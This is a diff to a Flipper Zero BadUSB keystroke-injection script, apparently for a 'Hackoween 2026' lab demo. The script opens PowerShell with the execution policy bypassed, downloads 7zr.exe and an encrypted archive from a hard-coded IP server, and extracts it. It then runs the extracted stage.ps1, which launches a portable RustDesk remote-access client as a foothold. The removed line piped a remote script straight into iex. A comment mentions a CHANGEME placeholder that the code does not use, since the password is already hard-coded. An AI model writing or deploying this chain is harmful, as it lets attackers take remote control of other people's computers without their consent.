@@ -1,8 +1,50 @@
-REM Hackoween 2026 — Act 1: USB -> portable RustDesk foothold (lab victim VM only).
-REM User-level only: no admin, no UAC, no hidden window. Set Flipper + victim to US layout.
-REM DELAY 3000 lets Windows enumerate the HID device before typing starts.
+REM Hackoween 2026 — Act 1: USB -> download + extract boo.7z (lab victim VM only).
+REM User-level only: no admin, no UAC, no install, no hidden window.
+REM Set Flipper + victim to US layout. DELAY 3000 lets Windows enumerate the HID
+REM device before typing starts.
+REM
+REM Chain: pull portable 7zr.exe + the encrypted boo.7z from the lab web server
+REM (64.58.102.35:8080) into %TEMP% -> extract into C:\tmp -> run the extracted
+REM stage.ps1, which launches the portable RustDesk client that shipped in the
+REM archive. Nothing is installed; everything runs as the current user.
+REM
+REM boo.7z must contain, at the archive root: stage.ps1, rustdesk.exe, RustDesk2.toml, RustDesk.toml
+REM
+REM Typed into a PowerShell console rather than the Run box: the Run dialog truncates
+REM at ~260 characters and this chain is past that. It also reads better on stage —
+REM one statement per line as it executes.
+
 DELAY 3000
 GUI r
 DELAY 750
-STRING powershell -ep bypass -c "iwr http://10.13.37.5/stage.ps1 -UseBasicParsing | iex"
+STRING powershell -ep bypass
+ENTER
+DELAY 2500
+
+REM --- Paths: %TEMP% for the tooling + archive, C:\tmp for the extracted contents.
+STRING $t=$env:TEMP; $d='C:\tmp'; md $d -Force | Out-Null
+ENTER
+DELAY 300
+
+REM --- Portable 7-Zip console build from the lab server. No install, no elevation.
+STRING $z=Join-Path $t '7zr.exe'; iwr http://64.58.102.35:8080/7zr.exe -OutFile $z -UseBasicParsing
+ENTER
+DELAY 1500
+
+REM --- The archive.
+STRING $a=Join-Path $t 'boo.7z'; iwr http://64.58.102.35:8080/boo.7z -OutFile $a -UseBasicParsing
+ENTER
+DELAY 2000
+
+REM --- Extract into C:\tmp. Replace CHANGEME with the real archive password.
+REM     Single-quoted so PowerShell does not expand $ or ` in it. If the password
+REM     itself contains a single quote, double it: 'it''s'. Keep it to printable
+REM     US-layout ASCII — the Flipper types this literally over HID.
+STRING & $z x $a ('-o'+$d) '-phackoween' -y
+ENTER
+DELAY 1500
+
+REM --- Hand off to the bootstrap that came out of the archive.
+REM     Already running under -ep bypass, so the .ps1 executes without a policy prompt.
+STRING & (Join-Path $d 'stage.ps1')
 ENTER
